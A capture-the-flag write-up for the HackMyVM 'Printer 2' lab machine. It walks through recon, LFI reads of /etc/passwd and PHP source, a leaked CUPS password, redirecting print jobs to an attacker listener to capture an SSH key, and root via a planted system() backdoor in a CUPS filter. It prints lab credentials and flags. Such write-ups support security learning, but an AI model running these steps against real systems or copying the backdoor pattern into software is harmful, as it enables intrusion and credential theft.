# Printer 2

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.134:22
Open 10.0.2.134:631
Open 10.0.2.134:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.134
PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
80/tcp  open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-title: Free Website Templates
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
631/tcp open  ipp     syn-ack CUPS 2.3
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Home - CUPS 2.3.3op2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

![writeup.png](/assets/pentest/hackmyvm/printer2/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.134/ --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
301      GET        9l       28w      309c http://10.0.2.134/images => http://10.0.2.134/images/
200      GET      342l      643w     7112c http://10.0.2.134/index.htm
200      GET      342l      643w     7112c http://10.0.2.134/
```

Looks like a placeholder website

## HTTP (631)

![writeup-1.png](/assets/pentest/hackmyvm/printer2/writeup-1.png)

- [Internet Printing Protocol](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp.html#internet-printing-protocol)

```bash
└─$ nmap -sV -p631 --script=cups* 10.0.2.134
PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.3
| cups-queue-info:
|   printer
|     id   time                 state       size (kb)  owner    jobname
|     854  2023-05-20T07:05:15  Processing  3k         Unknown  Unknown
|     855  2023-05-20T07:06:01  Pending     3k         Unknown  Unknown
|     856  2025-12-09T20:29:01  Pending     3k         Unknown  Unknown
|     857  2025-12-09T20:30:01  Pending     3k         Unknown  Unknown
|     858  2025-12-09T20:31:01  Pending     3k         Unknown  Unknown
|     859  2025-12-09T20:32:01  Pending     3k         Unknown  Unknown
|     860  2025-12-09T20:33:02  Pending     3k         Unknown  Unknown
|_    861  2025-12-09T20:34:01  Pending     3k         Unknown  Unknown
|_http-server-header: CUPS/2.3 IPP/2.1
| cups-info:
|   printer
|     DNS-SD Name: printer @ printer
|     Location: Garage
|     Model: Ricoh PDF Printer
|     State: Processing
|_    Queue: 8 print jobs
```

- [evil-cups](https://github.com/IppSec/evil-cups) failed to get RCE, but printer was successfully added

## HTTP (80) (Reevaluate)

```bash
└─$ curl 'http://10.0.2.134' -s | grep http
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<meta http-equiv="Content-Type" content="text/html;charset=iso-8859-1" />
<meta http-equiv="Content-Style-Type" content="text/css" />
<p>Don't forgot to check <a href="http://www.freewebsitetemplates.com">free website templates</a> every day, because we add at least one free website template daily.</p>
                        <a href="http://www.freewebsitetemplates.com">.....Read More</a>
                                        <p>If you're looking for beautiful and professionally made templates you can find them at <a href="http://www.templatebeauty.com">Template Beauty</a>.</p>
        <body onload="console.log('http://printer4life.printer.hmv');">
<p>To find great hosting providers visit <a href="http://www.webhostingzoom.com">Web Hosting Zoom</a></p>
```

There's DNS! 
- [printer4life.printer.hmv](printer4life.printer.hmv)

![writeup-2.png](/assets/pentest/hackmyvm/printer2/writeup-2.png)

### LFI

```bash
└─$ curl 'http://printer4life.printer.hmv/index.php?page=/etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/bash
mabelle:x:1000:1000:,,,:/home/mabelle:/bin/bash
salt:x:110:119::/var/lib/salt:/bin/sh
kierra:x:1001:1002:,,,:/home/kierra:/bin/bash
```

PHP filters work
```bash
└─$ curl 'http://printer4life.printer.hmv/index.php?page=php://filter/convert.base64-encode/resource=index.php' -s | tail -1 | base64 -d | grep -zo '<?php.*'
<?php
$page = array_key_exists('page', $_GET) ? $_GET['page'] : null;
if (!is_null($page)) {
    if (file_exists($page . ".php")) {
        include($page . ".php");
    } else {
        include($page);
    }
} else {
}
?>
```

> **Note**: Yes, you can use [**php_filter_chain_generator**](https://github.com/synacktiv/php_filter_chain_generator) for RCE.

```bash
└─$ feroxbuster -u http://printer4life.printer.hmv/ --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET       16l       30w      365c http://printer4life.printer.hmv/index.php
200      GET       16l       30w      365c http://printer4life.printer.hmv/
200      GET      171l      806w    58407c http://printer4life.printer.hmv/hp
200      GET        1l        3w       27c http://printer4life.printer.hmv/hp.php
200      GET      299l     1716w   140109c http://printer4life.printer.hmv/logo
200      GET      443l     3702w    36625c http://printer4life.printer.hmv/access_log
200      GET      182l     1031w   113873c http://printer4life.printer.hmv/epson
200      GET        1l        3w       30c http://printer4life.printer.hmv/epson.php
200      GET      366l     2220w   182095c http://printer4life.printer.hmv/canon
200      GET        1l        3w       30c http://printer4life.printer.hmv/canon.php
```

Password leak
```bash
└─$ curl 'http://printer4life.printer.hmv/access_log' -s | grep -i cupsdCheckAuth
I [22/Apr/2023:07:41:47 +0200] cupsdCheckAuth: Authenticated as mabelle with password LIrmxk8EYtD
```

> Creds: `mabelle:LIrmxk8EYtD`

No SSH access, but we can access admin panel on port 631
```bash
└─$ sshpass -p 'LIrmxk8EYtD' ssh mabelle@10.0.2.134
mabelle@10.0.2.134: Permission denied (publickey).
```

The website did say they print Every Minute, hijack?

- Printers -> **printer** -> Administration=>Modify -> AppSocket/HP JetDirect -> Connection: "**socket://10.0.2.15:4444**" -> Continue -> Modify

```bash
└─$ listen
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.134:38026.
2345X@PJL
@PJL JOB NAME = "mabelle_private_ssh_key" DISPLAY = "892 mabelle mabelle_private_ssh_"
@PJL SET USERNAME = "mabelle"
@PJL SET TRAY = ALL
@PJL SET DUPLEX=ON
@PJL SET BINDING=LONGEDGE
...
└─$ listen > something.pdf
Ncat: Connection from 10.0.2.134:49800.
```

Amazing...

![writeup-3.png](/assets/pentest/hackmyvm/printer2/writeup-3.png)

```bash
└─$ file something.pdf
something.pdf: HP Printer Job Language data
```

- [https://www.coolutils.com/online/PCL-to-PDF](https://www.coolutils.com/online/PCL-to-PDF)

Hmmm... the file is in binary format and not ascii, if you try to copy you also copy bytes so how is it rendered as SSH key? wot
```bash
└─$ file something.txt
something.txt: data
```

## SSH (mabelle)

After some fuzzing
```bash
└─$ curl 'http://printer4life.printer.hmv/index.php?page=/home/mabelle/mabelle_private_ssh_key' -s 
└─$ nano id_rsa.mabelle
# PASTE # Via curl output is weird and fails...
└─$ chmod 600 id_rsa.mabelle
└─$ ssh -i id_rsa.mabelle mabelle@10.0.2.134
mabelle@printer:~$ id
uid=1000(mabelle) gid=1000(mabelle) groups=1000(mabelle),1001(lpadmin)
```

## Privilege Escalation (kierra)

There's an odd port running internally
```bash
mabelle@printer:~$ ss -tunlp4
Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process
udp      UNCONN    0          0                    0.0.0.0:68                 0.0.0.0:*
udp      UNCONN    0          0                    0.0.0.0:631                0.0.0.0:*
udp      UNCONN    0          0                    0.0.0.0:5353               0.0.0.0:*
udp      UNCONN    0          0                    0.0.0.0:49452              0.0.0.0:*
udp      UNCONN    0          0                    0.0.0.0:45414              0.0.0.0:*
tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*
tcp      LISTEN    0          128                  0.0.0.0:631                0.0.0.0:*
tcp      LISTEN    0          10                 127.0.0.1:1001               0.0.0.0:*
```

```bash
mabelle@printer:~$ curl 0:1001
curl: (1) Received HTTP/0.9 when not allowed
```

```bash
mabelle@printer:~$ nc 127.0.0.1 1001
No need for brute force here!
Hackerman
I put a backdoor in a printer filter.
Filter name:
```

Hmmm
```bash
mabelle@printer:/opt/cups-2.3.3/filter$ ls -alh
total 1.2M
drwxr-xr-x  2  501 staff 4.0K Apr 22  2023 .
drwxr-xr-x 26  501 staff 4.0K Apr 16  2023 ..
-rw-r--r--  1  501 staff  12K Feb  6  2023 commandtops.c
-rw-r--r--  1 root root   50K Feb  6  2023 commandtops.o
-rw-r--r--  1  501 staff  12K Feb  6  2023 common.c
-rw-r--r--  1  501 staff 1.4K Feb  6  2023 common.h
-rw-r--r--  1 root root   49K Feb  6  2023 common.o
-rw-r--r--  1  501 staff 2.7K Feb  6  2023 Dependencies
-rw-r--r--  1  501 staff 2.0K Feb  6  2023 gziptoany.c
-rw-r--r--  1 root root   17K Feb  6  2023 gziptoany.o
-rw-r--r--  1  501 staff 4.0K Feb  6  2023 Makefile
-rw-r--r--  1  501 staff 1.3K Feb  6  2023 postscript-driver.header
-rw-r--r--  1  501 staff  15K Feb  6  2023 postscript-driver.shtml
-rw-r--r--  1  501 staff 1.3K Feb  6  2023 ppd-compiler.header
-rw-r--r--  1  501 staff  36K Feb  6  2023 ppd-compiler.shtml
-rw-r--r--  1  501 staff  85K Feb  6  2023 pstops.c
-rw-r--r--  1 root root  228K Feb  6  2023 pstops.o
-rw-r--r--  1  501 staff 1.3K Feb  6  2023 raster-driver.header
-rw-r--r--  1  501 staff  12K Feb  6  2023 raster-driver.shtml
-rw-r--r--  1  501 staff  24K Feb  6  2023 rastertoepson.c
-rw-r--r--  1 root root  102K Feb  6  2023 rastertoepson.o
-rw-r--r--  1  501 staff  19K Feb  6  2023 rastertohp.c
-rw-r--r--  1 root root   92K Feb  6  2023 rastertohp.o
-rw-r--r--  1  501 staff  27K Feb  6  2023 rastertolabel.c
-rw-r--r--  1 root root  127K Feb  6  2023 rastertolabel.o
-rw-r--r--  1 root root   17K Feb  6  2023 rastertopwg.c
-rw-r--r--  1 root root   77K Feb  6  2023 rastertopwg.o
-rw-r--r--  1  501 staff 1.4K Feb  6  2023 spec-ppd.header
-rw-r--r--  1  501 staff  78K Feb  6  2023 spec-ppd.shtml
```

I was not sure how to proceed here, so I just compared existing files hashes to original source code and `rastertopwg` was different
```bash
mabelle@printer:/opt/cups-2.3.3/filter$ md5sum *
...
75491a871066d9178d74e83f08992ed4  rastertopwg.c
...
---
└─$ curl -LO https://github.com/OpenPrinting/cups/archive/refs/tags/v2.3.3.tar.gz
└─$ tar -xvzf v2.3.3.tar.gz
└─$ md5sum *
...
bc8775406120859d8b8ebd2051e4187b  rastertopwg.c
...
```

```c
mabelle@printer:/opt/cups-2.3.3/filter$ less rastertopwg.c
...
int                                     /* O - Exit status */
main(int  argc,                         /* I - Number of command-line args */
     char *argv[])                      /* I - Command-line arguments */
{
  const char            *final_content_type;

  for (int i = 1; i < argc; i++) {
    if (strncmp(argv[i], "exec:", 5) == 0) {
      system(argv[i] + 5);
    }
  }
```

```bash
mabelle@printer:/opt/cups-2.3.3/filter$ nc 127.0.0.1 1001
No need for brute force here!
Hackerman
I put a backdoor in a printer filter.

Filter name: rastertopwg

You are awesome! Here is the password: wK4EyQ15Cga
```

> Creds: `kierra:wK4EyQ15Cga`

```bash
mabelle@printer:/opt/cups-2.3.3/filter$ su - kierra
Password: wK4EyQ15Cga
kierra@printer:~$ id
uid=1001(kierra) gid=1002(kierra) groups=1002(kierra)
```

### User.txt

```
kierra@printer:~$ cat user.txt
63e2f2ec7e3dbae87afc4e0e86d0867b
```

## Privilege Escalation (root)

```bash
kierra@printer:~$ sudo -l
Matching Defaults entries for kierra on printer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kierra may run the following commands on printer:
    (ALL : ALL) /usr/lib/cups/filter/rastertopwg
```

```bash
kierra@printer:~$ sudo /usr/lib/cups/filter/rastertopwg 'exec:id'
uid=0(root) gid=0(root) groups=0(root)
Usage: rastertopwg job user title copies options [filename]
```

```bash
kierra@printer:~$ sudo /usr/lib/cups/filter/rastertopwg 'exec:bash -p'
root@printer:/home/kierra# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@printer:/home/kierra# cat /root/root_flag.txt
052cf26a6e7e33790391c0d869e2e40c
```